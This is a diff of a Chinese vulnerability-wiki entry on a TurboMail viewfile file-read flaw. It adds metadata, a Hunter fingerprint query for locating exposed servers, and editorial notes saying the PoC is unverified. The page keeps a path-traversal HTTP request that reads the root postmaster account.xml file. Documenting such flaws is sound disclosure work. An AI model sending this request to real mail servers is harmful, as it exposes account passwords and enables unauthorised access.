@@ -1,9 +1,51 @@
 ---
-fofa: "web.body="
 source: "wy876 漏洞文库"
+title: "TurboMail 邮件系统 viewfile 文件读取漏洞"
+product: "TurboMail"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "Affected version/authentication unspecified; included Blade-Auth cookie unexplained"
+hunter: "web.body=\"maintlogin.jsp\" && web.body=\"/mailmain?type=logout\""
+source_status: "unknown"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-c2a662dce01508cd9056841c"
+entity_id: "ve-c2a662dce01508cd9056841c"
+schema_version: "1"
 ---
 
 # TurboMail 邮件系统 viewfile 文件读取漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Affected version/authentication unspecified; included Blade-Auth cookie unexplained
+- 证据范围：Read request plus base64 example and login URL; no response/login verification
+
+### 本次正文校订
+
+- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
+- 将误放入 FOFA 的 Hunter 查询按正文原式保存到 hunter 字段，不改写查询语义。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- fofa metadata is truncated web.body= and actually sourced from Hunter query
+- Long embedded Blade-Auth JWT appears unrelated/captured credential artifact; redact and explain necessity rather than copy
+- Base64 encoding mislabeled encryption; =3D transport escaping needs correct layer description instead of arbitrary removal
+- HTTP and base64 blocks mislabeled java; version is only product name
+- Full account/password artifact should be sanitized in examples
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 # 一、漏洞简介
 广州拓波软件科技有限公司TurboMail 邮件系统 viewfile 文件读取漏洞，攻击者可通过此漏洞读取账户密码，从而登录后台进一步利用。
@@ -19,7 +61,7 @@ source: "wy876 漏洞文库"
 # 四、漏洞复现
 1. 通过poc读取账号密码
 
-```java
+```http
 GET /viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml HTTP/1.1
 Host: {hostname}
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
